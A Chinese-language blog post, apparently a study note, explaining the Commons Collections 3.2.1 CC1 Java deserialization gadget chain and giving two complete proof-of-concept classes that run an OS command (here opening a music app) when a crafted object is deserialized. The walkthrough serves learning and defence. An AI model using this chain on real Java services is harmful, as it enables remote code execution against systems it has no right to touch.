---
layout: post
title: CC链-CC1
subtitle: Let's start learning!
tags: [books, test]
author: Sine
---

# CC1

JDK版本小于JDK-8u71，commons-collections版本等于3.2.1

## CC1-1

**利用链：**

**AnnotationInvocationHandler.readobject()->setValue()-> TransformedMap.checkSetValue()->chainedTransformer.transform->new ConstantTransformer（Runtime.class）->return this.iConstant(Runtime.class)->getMethod(getRuntime)->invoke->exec(“”)**

Transformed是一个接口类，提供了一个transform方法

![image-20250219095324974](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250219095330464.png)

InvokerTransformer实现了Transformed，它的transform方法实现了反射，可以调用任意方法，类为传入的input参数

![image-20250217164602236](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217164602280.png)

且方法名、参数类型和参数值在构造方法中赋值，可控

![image-20250217170114241](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217170114341.png)

可以初始化一个InvokerTransformer类对象，调用transform方法

首先，我们直接使用反射去调用Runtime的exec方法来执行命令是这样的

```JAVA
Runtime runtime = Runtime.getRuntime();
Class runtimeClass=runtime.getClass();
Method execMethod=runtimeClass.getMethod("exec", String.class);
execMethod.invoke(runtime,"open /Applications/NeteaseMusic.app");
```

成功弹出app

![image-20250217171517418](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217171517455.png)

利用InvokerTransformer来调用，先初始化一个InvokerTransformer对象，传入方法名为要调用的方法exec，参数类型为字符串（Class[]格式），参数值即要执行的命令，再调用初始化InvokerTransformer对象的transform方法，传入的参数为要反射调用的类

```java
Runtime runtime = Runtime.getRuntime();
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"}).transform(runtime);
```

使得transform的反射接收参数后变为

```java
Class cls = runtime.getClass();
Method method = cls.getMethod(exec, new Class[]{String.class});
return method.invoke(runtime, new Object[]{"open /Applications/NeteaseMusic.app"});
```

![image-20250217202812452](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217202812563.png)

然后我们需要再往上找，看哪里可以调用InvokerTransformer的transform方法，因为反序列化会走到他的readObject方法中，所以我们的调用链是从readobject开始逐步走到InvokerTransformer的transform方法中

寻找InvokerTransformer的transform的上层调用点时，发现了TransformMap类，它的checkSetValue方法调用了transform

![image-20250217210546525](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217210546568.png)

而他的valueTransformer在构造函数中被赋值，因为构造方法为`protected`方法

![image-20250217210646013](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217210646056.png)

需要用decorate方法来调用构造方法，因为checkSetValue调用transform方法只用到了valueTransformer，所以第一个参数只需要传入一个空的map，第二个参数传入一个null即可

![image-20250217210814726](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217210814774.png)

再往上找哪里调用了checkSetValue方法，发现在AbstractInputCheckedMapDecorator抽象类中MapEntry类的setValue方法里调用到了，而AbstractInputCheckedMapDecorator抽象类为TransformMap的父类

![image-20250217213101405](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217213101447.png)

![image-20250217213219150](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217213219196.png)

所以我们可以通过entry来调用他的setValue方法，遍历一个map，获取entry，再调用entry的setValue方法

map不能为空，可先给一对任意键值对

```java
				Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer= new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"});
        HashMap Map = new HashMap();
        Map<Object,Object> transformedMap = TransformedMap.decorate(Map,null,invokerTransformer);
        Map.put("aaa","bbb");
        for (Map.Entry entry:transformedMap.entrySet())
        {
            entry.setValue(Runtime.getRuntime());
        }
```

成功弹出

![image-20250217214119103](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217214119142.png)

Runtime是一个不可反序列化的类，但是Runtime.class可以，因为class类可发序列化

![image-20250217221429789](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217221429835.png)

这里我们可以直接使用InvokerTransformer来反射调用Runtime，成功弹出app

```java
Method getRuntime =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
Runtime currentRuntime = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"}).transform(currentRuntime);
```

![image-20250217221609057](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217221609129.png)

然后我们来看chainedTransformer类，它的transform方法传入的参数是一个数组时，会调用每一个参数的transform方法，前一个参数调用tranform的返回值会作为下一个参数调用transform的参数

![image-20250217203624746](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217203624785.png)

可以使用chainedTransformer将上面三部分InvokerTransformer来反射调用Runtime包裹起来，再调用transform

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"})
});
chainedTransformer.transform(Runtime.class);
```

![37B0628D-DADF-418E-BD3B-2587B0D95BF7](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217222007063.png)

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"})
        });
//        chainedTransformer.transform(Runtime.class);
        HashMap Map = new HashMap();
        Map<Object,Object> transformedMap = TransformedMap.decorate(Map,null,chainedTransformer);
        Map.put("aaa","bbb");
        for (Map.Entry entry:transformedMap.entrySet())
        {
            entry.setValue(Runtime.class);
        }
```

![image-20250217222513068](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217222513185.png)

我们最后要找一个readobject去实现，然后发现AnnotationInvocationHandler的readObject方法中遍历了一个map，并调用了它entry的setValue方法，但此时，setValue方法的参数不可控

![image-20250217214421270](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217214421311.png)

这时候我们可以来看ConstantTransformer的transform方法，无论传入的参数为什么，返回值始终为iConstant，而iConstant在构造方法中赋值

![image-20250217214642496](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217214642540.png)

所以直接将ConstantTransformer添加到传入ChainedTransformer的数组Transform[]的第一个值

ConstantTransformer(Runtime.class)调用transform的返回值为Runtime.class，作为参数传入数组第二部分即变为new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class)，他的返回值传入第三部分，即实现了嵌套使用InvokerTransformer来调用的功能，也解决了AnnotationInvocationHandler的readObject方法调用setValue时参数不可控的问题

发现执行不成功

![image-20250217224244576](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217224244701.png)

进到AnnotationInvocationHandler的readObject方法，有个memberType不等于null判断，这里要看type是什么

![image-20250217224320088](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217224320168.png)

type是实例化AnnotationInvocationHandler方法的第一个参数，获取他的成员方法和传入的map的key做对比

![image-20250217224610069](/Users/sine/Library/Application Support/typora-user-images/image-20250217224610069.png)

Target.class有成员变量value，所以要把map的key值改成value

![image-20250217225005683](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217225005774.png)

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1Test1 {

    public static void main(String[] args) throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"})
        });
        HashMap map = new HashMap();
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        map.put("value","bbb");
        Class AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotartionConstructer = AnnotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);
        AnnotartionConstructer.setAccessible(true);
        Object o = AnnotartionConstructer.newInstance(Target.class,transformedMap);
        serialize(o);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }



}
```

![image-20250217223428712](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217223428827.png)


## CC1-2

反序列化方法deserialize->AnnotationInvocationHandler.readobject()->Proxy(annotationInvocationHandler).xxx（invoke）->LazyMap.get()->transform()

LazyMap.get()中调用了transform方法

![image-20250218104231354](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218104231397.png)

factory可控，在构造函数中被赋值，构造函数为protected，所以用decorate方法来调用构造方法

![image-20250218104441772](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218104441814.png)

配合CC1第一条链部分，利用LazyMap的get方法去调用transform来实现，成功弹出

![image-20250218153948893](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218153948980.png)

```java
 Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/NeteaseMusic.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> decorate = LazyMap.decorate(map, chainedTransformer);
        decorate.get(Runtime.class);
```

我们要找从readobject方法走到LazyMap的get方法的调用流程，但是未找到readObject方法直接调用它

然后我们发现AnnotationInvocationHandler的invoke方法调用了get方法

![image-20250218144625646](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218144625775.png)

且memberValues可控，在构造函数里被赋值

![image-20250218144658629](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218144658712.png)

AnnotationInvocationHandler的readObject方法里调用了memeberValues的entryset()方法

![image-20250218152844772](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218152844906.png)

初始化一个AnnotationInvocationHandler对象，利用代理类，创建一个map代理实例，在readObject中，走到memeberValues的entryset()方法时，会触发代理机制，进入invoke方法，在初始化时，把memberValues赋值为LazyMap，走到LazyMap.get方法，从而执行命令

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/NeteaseMusic.app"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> map = new HashMap<>();
Map<Object, Object> decorate = LazyMap.decorate(map, chainedTransformer);
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, decorate);
Map newMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);
Object o = constructor.newInstance(Target.class, newMap);
serialize(o);
unserialize("ser.bin");
```

![image-20250218154940022](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218154940156.png)

Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);//创建了一个实现了 `Map` 接口的代理对象。动态代理可以在运行时创建对象，并且拦截对该对象的所有方法调用。

AnnotationInvocationHandler的readObject方法中执行了memberValues.entrySet()，memberValues被赋值为LazyMap（调用了map对象的方法）从而触发了invoke方法
